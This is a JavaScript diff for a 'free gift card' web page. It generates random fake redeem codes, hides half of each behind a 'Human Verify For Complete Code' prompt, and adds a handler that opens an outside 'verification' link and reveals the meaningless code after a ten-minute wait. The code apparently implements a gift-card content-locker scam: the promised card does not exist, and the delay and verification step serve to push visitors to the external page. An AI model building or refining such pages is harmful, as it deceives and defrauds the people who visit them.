@@ -1,3 +1,6 @@
+// Global variable to store the full redeem code
+let currentRedeemCode = '';
+
 function generateRedeemCode() {
     // Generate a random 16-character redeem code
     const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
@@ -13,11 +16,11 @@ function claimGiftCard(type, amount) {
     const modal = document.getElementById('modal');
     const modalMessage = document.getElementById('modal-message');
     
-    // Generate redeem code
-    const redeemCode = generateRedeemCode();
-    const halfLength = Math.ceil(redeemCode.length / 2);
-    const visiblePart = redeemCode.substring(0, halfLength);
-    const hiddenPart = redeemCode.substring(halfLength);
+    // Generate redeem code and store it globally
+    currentRedeemCode = generateRedeemCode();
+    const halfLength = Math.ceil(currentRedeemCode.length / 2);
+    const visiblePart = currentRedeemCode.substring(0, halfLength);
+    const hiddenPart = currentRedeemCode.substring(halfLength);
     
     // Create obscured version of hidden part
     const obscuredPart = hiddenPart.replace(/[A-Z0-9]/g, '●');
@@ -26,7 +29,7 @@ function claimGiftCard(type, amount) {
         You've claimed a <strong>$${amount} ${type}</strong> gift card!<br><br>
         <div class="redeem-code-container">
             <div class="redeem-code-label">Your Redeem Code:</div>
-            <div class="redeem-code">
+            <div class="redeem-code" id="redeem-code-display">
                 <span class="code-visible">${visiblePart}</span><span class="code-hidden">${obscuredPart}</span>
             </div>
             <div class="redeem-code-note">🔥Human Verify For Complete Code🎁</div>
@@ -46,6 +49,37 @@ function claimGiftCard(type, amount) {
             button.style.cursor = 'not-allowed';
         }
     });
+}
+
+function handleContinueClick(event) {
+    event.preventDefault();
+    
+    // Change the redeem code display to show a loading spinner
+    const redeemCodeDisplay = document.getElementById('redeem-code-display');
+    if (redeemCodeDisplay) {
+        redeemCodeDisplay.innerHTML = `
+            <div class="loading-spinner"></div>
+            <div style="margin-top: 10px; font-size: 14px; color: #666;">Processing... Please wait 10 minutes</div>
+        `;
+        
+        // Start the 10-minute timer (600,000 milliseconds)
+        setTimeout(() => {
+            // After 10 minutes, reveal the complete code
+            redeemCodeDisplay.innerHTML = `
+                <span class="code-visible" style="color: #4CAF50; font-weight: bold;">${currentRedeemCode}</span>
+            `;
+            
+            // Update the note
+            const redeemCodeNote = document.querySelector('.redeem-code-note');
+            if (redeemCodeNote) {
+                redeemCodeNote.innerHTML = '✅ Complete Code Revealed!';
+                redeemCodeNote.style.color = '#4CAF50';
+            }
+        }, 600000); // 10 minutes = 600,000 milliseconds
+    }
+    
+    // Open the verification link
+    window.open('https://neel000000000000000000000000001/us/', '_blank');
 }
 
 function closeModal() {
